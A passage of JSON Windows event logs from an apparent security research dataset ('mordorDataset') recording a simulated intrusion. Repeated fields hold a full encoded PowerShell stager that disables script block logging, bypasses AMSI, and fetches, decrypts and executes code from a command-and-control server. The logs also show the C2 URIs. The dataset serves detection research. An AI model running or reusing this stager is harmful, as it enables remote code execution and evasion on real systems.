FMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = New-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11285\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Category":"Executing Pipeline","@timestamp":"2020-07-22T04:18:59.080Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"pgustavo","ExecutionProcessID":9076,"EventType":"INFO","OpcodeValue":20,"EventTime":"2020-07-22 00:18:58","Severity":"INFO","EventID":4103,"ThreadID":5048,"RecordNumber":8726}
{"Task":8,"EventReceivedTime":"2020-07-22 00:18:59","Opcode":"Info","port":55069,"SeverityValue":2,"Keywords":36028797018963968,"@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"SourceName":"PowerShell","Channel":"Windows PowerShell","SourceModuleName":"eventlog","Message":"Pipeline execution details for command line:                                 $script:Headers.GetEnumerator() | % {$a9486.Headers.Add($_.Name, $_.Value)}\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=11286\r\n\r\n\tUserId=MORDOR\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=78f49efe-32de-4c99-80f6-3f5158742484\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=                                $script:Headers.GetEnumerator() | % {$a9486.Headers.Add($_.Name, $_.Value)}\n \r\n\r\nDetails: \r\nCommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$a9486.Headers.Add($_.Name, $_.Value)\"\r\n","Category":"Pipeline Execution Details","@timestamp":"2020-07-22T04:18:59.080Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":0,"EventType":"INFO","EventTime":"2020-07-22 00:18:58","Severity":"INFO","EventID":800,"ThreadID":0,"RecordNumber":8989}
{"Task":8,"EventReceivedTime":"2020-07-22 00:19:00","Opcode":"Info","port":55069,"SeverityValue":2,"Keywords":36028797018963968,"@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"SourceName":"PowerShell","Channel":"Windows PowerShell","SourceModuleName":"eventlog","Message":"Pipeline execution details for command line:                                 $taskURI = $script:TaskURIs | Get-Random\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=11288\r\n\r\n\tUserId=MORDOR\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=78f49efe-32de-4c99-80f6-3f5158742484\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=                                $taskURI = $script:TaskURIs | Get-Random\n \r\n\r\nDetails: \r\nCommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n","Category":"Pipeline Execution Details","@timestamp":"2020-07-22T04:19:00.080Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":0,"EventType":"INFO","EventTime":"2020-07-22 00:18:58","Severity":"INFO","EventID":800,"ThreadID":0,"RecordNumber":8990}
{"Task":13,"EventReceivedTime":"2020-07-22 00:19:00","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceModuleType":"im_msvistalog","Version":2,"tags":["mordorDataset"],"Domain":"NT AUTHORITY","ProcessGuid":"{b59756a9-996d-5f14-4900-000000000400}","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"3372","UserID":"S-1-5-18","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\W32Time\\Config\\LastKnownGoodTime","Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-07-22 04:18:58.758\r\nProcessGuid: {b59756a9-996d-5f14-4900-000000000400}\r\nProcessId: 3372\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\W32Time\\Config\\LastKnownGoodTime\r\nDetails: QWORD (0x01d65fdf-0x38b2b2dc)","Image":"C:\\windows\\system32\\svchost.exe","EventTypeOrignal":"INFO","UtcTime":"2020-07-22 04:18:58.758","@timestamp":"2020-07-22T04:19:00.080Z","Details":"QWORD (0x01d65fdf-0x38b2b2dc)","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":9368,"OpcodeValue":0,"EventType":"SetValue","EventTime":"2020-07-22 00:18:58","Severity":"INFO","EventID":13,"ThreadID":6244,"RecordNumber":1782126}
{"Task":12,"EventReceivedTime":"2020-07-22 00:19:00","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceModuleType":"im_msvistalog","Version":2,"tags":["mordorDataset"],"Domain":"NT AUTHORITY","ProcessGuid":"{b59756a9-b239-5f17-5307-000000000400}","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"9076","UserID":"S-1-5-18","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","TargetObject":"HKU\\S-1-5-21-2253742117-2054739524-205962475-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-07-22 04:18:58.821\r\nProcessGuid: {b59756a9-b239-5f17-5307-000000000400}\r\nProcessId: 9076\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-2253742117-2054739524-205962475-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","EventTypeOrignal":"INFO","UtcTime":"2020-07-22 04:18:58.821","@timestamp":"2020-07-22T04:19:00.081Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":9368,"OpcodeValue":0,"EventType":"CreateKey","EventTime":"2020-07-22 00:18:58","Severity":"INFO","EventID":12,"ThreadID":6244,"RecordNumber":1782127}
{"Task":12810,"SourcePort":"51072","Opcode":"Info","FilterRTID":"0","LayerName":"%%14608","EventReceivedTime":"2020-07-22 00:19:00","port":55069,"SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","SourceModuleType":"im_msvistalog","Version":0,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"0.0.0.0","ProcessId":"9076","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe","Message":"The Windows Filtering Platform has permitted a bind to a local port.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t9076\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\r\n\r\nNetwork Information:\r\n\tSource Address:\t\t0.0.0.0\r\n\tSource Port:\t\t51072\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t0\r\n\tLayer Name:\t\tResource Assignment\r\n\tLayer Run-Time ID:\t36","Category":"Filtering Platform 